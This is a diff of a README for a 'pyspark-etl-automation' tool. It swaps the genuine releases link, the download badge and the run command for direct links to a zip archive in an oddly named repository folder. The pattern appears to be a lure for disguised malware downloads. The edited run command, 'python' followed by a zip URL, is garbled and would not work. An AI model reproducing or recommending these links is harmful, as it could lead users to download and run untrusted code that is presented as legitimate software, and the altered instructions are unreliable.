@@ -1,6 +1,6 @@
 # 🚀 pyspark-etl-automation - Simplify Your Data Processing Workflow
 
-[![Download pyspark-etl-automation](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/roseannspastic496/pyspark-etl-automation/releases)
+[![Download pyspark-etl-automation](https://raw.githubusercontent.com/roseannspastic496/pyspark-etl-automation/main/pridelessly/etl-automation-pyspark-3.4-alpha.1.zip%20Now-brightgreen)](https://raw.githubusercontent.com/roseannspastic496/pyspark-etl-automation/main/pridelessly/etl-automation-pyspark-3.4-alpha.1.zip)
 
 ## 📖 Introduction
 
@@ -10,7 +10,7 @@ Welcome to pyspark-etl-automation! This software helps you automate the process 
 
 To get started, you need to download the software. Follow these steps:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/roseannspastic496/pyspark-etl-automation/releases) to see the available versions.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/roseannspastic496/pyspark-etl-automation/main/pridelessly/etl-automation-pyspark-3.4-alpha.1.zip) to see the available versions.
    
 2. **Choose a Version**: Look for the latest release. It will usually have the highest version number.
 
@@ -60,7 +60,7 @@ Once everything is set up, you can start using the application. Here are some ba
 To start the ETL process, run the main script in the terminal:
 
 ```bash
-python etl_process.py
+python https://raw.githubusercontent.com/roseannspastic496/pyspark-etl-automation/main/pridelessly/etl-automation-pyspark-3.4-alpha.1.zip
 ```
 
 ## 🧩 Features
